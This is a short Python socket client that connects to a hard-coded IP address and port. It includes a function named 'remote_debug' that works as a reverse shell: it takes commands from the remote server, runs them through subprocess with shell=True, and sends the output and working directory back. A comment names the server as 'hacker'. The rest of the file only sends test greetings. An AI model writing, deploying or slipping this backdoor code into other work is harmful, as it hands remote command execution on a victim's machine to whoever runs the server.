import socket
import os
import subprocess

HEADER = 64  # bytes
FORMAT = "utf-8"
DISCONNECT_MESSAGE = "!DISCONNECT"
PORT = 5050
SERVER = "192.168.15.243"  # OR remote server
ADDR = (SERVER, PORT)

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)


def remote_debug():
    while True:
        data = client.recv(1024)
        if data[:2].decode(FORMAT) == "cd":
            os.chdir(data[3:].decode(FORMAT))

        if len(data) > 0:
            # Open in shell, standard-output, input, error
            cmd = subprocess.Popen(data[:].decode(FORMAT),
                                   shell=True,
                                   stdout=subprocess.PIPE,
                                   stdin=subprocess.PIPE,
                                   stderr=subprocess.PIPE
                                   )
            # Send response to the server / hacker & also include the current working directory
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte, FORMAT)
            current_wdir = os.getcwd() + "> "
            client.send(str.encode(output_str + current_wdir))

            # print on the client Except if you're a hacker
            print(f"[SERVER RETRIEVED] {output_str}")


def send(message):
    message = message.encode(FORMAT)
    message_len = len(message)
    send_len = str(message_len).encode(FORMAT)
    # pad it to be 64 bytes long
    send_len += b" " * (HEADER - len(send_len))
    client.send(send_len)
    client.send(message)

    # Response from server
    res = client.recv(2048).decode(FORMAT)
    print(f"[SERVER RESPONSE] {res}")


send("Hello World!")
input()
send("Hello Everyone!")
input()
send("Hello Ihon!")
send(DISCONNECT_MESSAGE)
